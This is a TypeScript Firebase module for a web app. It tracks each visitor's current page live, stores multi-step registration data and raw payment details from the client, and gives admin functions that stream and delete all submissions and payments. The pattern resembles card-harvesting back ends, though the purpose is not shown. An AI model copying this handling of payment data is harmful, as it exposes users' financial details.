import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue, push, get, remove, onDisconnect, serverTimestamp as rtdbServerTimestamp } from "firebase/database";
import { 
  doc, 
  getFirestore, 
  setDoc, 
  collection, 
  addDoc, 
  getDocs, 
  query, 
  orderBy,
  onSnapshot,
  serverTimestamp,
  Timestamp,
  deleteDoc
} from "firebase/firestore";

const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  databaseURL: import.meta.env.VITE_FIREBASE_DATABASE_URL,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId: import.meta.env.VITE_FIREBASE_MEASUREMENT_ID,
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

function getVisitorId(): string {
  let visitorId = localStorage.getItem("visitor");
  if (!visitorId) {
    visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    localStorage.setItem("visitor", visitorId);
  }
  return visitorId;
}

// Online Status using Realtime Database
export const setOnlineStatus = () => {
  const visitorId = getVisitorId();
  const onlineRef = ref(database, `online/${visitorId}`);
  
  set(onlineRef, {
    visitorId,
    online: true,
    lastSeen: rtdbServerTimestamp(),
    currentPage: window.location.pathname,
  });

  // Remove entry completely on disconnect
  onDisconnect(onlineRef).remove();

  return () => {
    // Remove entry when component unmounts
    remove(onlineRef);
  };
};

export const updateOnlinePage = (page: string) => {
  const visitorId = getVisitorId();
  const onlineRef = ref(database, `online/${visitorId}`);
  
  set(onlineRef, {
    visitorId,
    online: true,
    lastSeen: rtdbServerTimestamp(),
    currentPage: page,
  });
};

export const subscribeToOnlineUsers = (callback: (users: any[]) => void) => {
  const onlineRef = ref(database, "online");
  return onValue(onlineRef, (snapshot) => {
    const data = snapshot.val();
    if (!data) {
      callback([]);
      return;
    }
    const users = Object.entries(data).map(([id, userData]: [string, any]) => ({
      id,
      ...userData,
    }));
    callback(users);
  });
};

export async function addData(data: any) {
  try {
    const visitorId = getVisitorId();
    const docRef = doc(db, "submissions", visitorId);
    await setDoc(docRef, {
      ...data,
      visitorId,
      updatedAt: serverTimestamp(),
    }, { merge: true });
    return true;
  } catch (error) {
    console.error("Error adding data:", error);
    return false;
  }
}

export const handleCurrentPage = async (page: string) => {
  const visitorId = getVisitorId();
  updateOnlinePage(page);
  await addData({ currentPage: page });
};

export const handlePay = async (paymentInfo: any, setPaymentInfo?: any) => {
  try {
    const visitorId = getVisitorId();
    const docRef = doc(db, "pays", visitorId);
    await setDoc(
      docRef,
      { 
        ...paymentInfo, 
        visitorId,
        status: "pending", 
        updatedAt: serverTimestamp() 
      },
      { merge: true }
    );
    if (setPaymentInfo) {
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
    return true;
  } catch (error) {
    console.error("Error adding payment:", error);
    return false;
  }
};

export const saveStepData = async (step: string, stepData: any) => {
  try {
    const visitorId = getVisitorId();
    const docRef = doc(db, "submissions", visitorId);
    await setDoc(docRef, {
      visitorId,
      [`step_${step}`]: {
        ...stepData,
        completedAt: new Date().toISOString(),
      },
      lastStep: step,
      updatedAt: serverTimestamp(),
    }, { merge: true });
    return true;
  } catch (error) {
    console.error("Error saving step data:", error);
    return false;
  }
};

export const completeRegistration = async (allData: any) => {
  try {
    const visitorId = getVisitorId();
    const docRef = doc(db, "submissions", visitorId);
    await setDoc(docRef, {
      ...allData,
      visitorId,
      status: "completed",
      completedAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    }, { merge: true });
    return true;
  } catch (error) {
    console.error("Error completing registration:", error);
    return false;
  }
};

export const getAllSubmissions = async () => {
  try {
    const submissionsRef = collection(db, "submissions");
    const snapshot = await getDocs(submissionsRef);
    return snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
    }));
  } catch (error) {
    console.error("Error getting submissions:", error);
    return [];
  }
};

export const getAllPayments = async () => {
  try {
    const paysRef = collection(db, "pays");
    const snapshot = await getDocs(paysRef);
    return snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
    }));
  } catch (error) {
    console.error("Error getting payments:", error);
    return [];
  }
};

export const subscribeToSubmissions = (callback: (data: any[]) => void) => {
  const submissionsRef = collection(db, "submissions");
  return onSnapshot(submissionsRef, (snapshot) => {
    const data = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
    }));
    callback(data);
  });
};

export const subscribeToPayments = (callback: (data: any[]) => void) => {
  const paysRef = collection(db, "pays");
  return onSnapshot(paysRef, (snapshot) => {
    const data = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
    }));
    callback(data);
  });
};

// Delete submission
export const deleteSubmission = async (submissionId: string) => {
  try {
    const docRef = doc(db, "submissions", submissionId);
    await deleteDoc(docRef);
    return true;
  } catch (error) {
    console.error("Error deleting submission:", error);
    return false;
  }
};

// Delete payment
export const deletePayment = async (paymentId: string) => {
  try {
    const docRef = doc(db, "pays", paymentId);
    await deleteDoc(docRef);
    return true;
  } catch (error) {
    console.error("Error deleting payment:", error);
    return false;
  }
};

// Delete online user from Realtime DB
export const deleteOnlineUser = async (visitorId: string) => {
  try {
    const onlineRef = ref(database, `online/${visitorId}`);
    await remove(onlineRef);
    return true;
  } catch (error) {
    console.error("Error deleting online user:", error);
    return false;
  }
};

export { db, database };
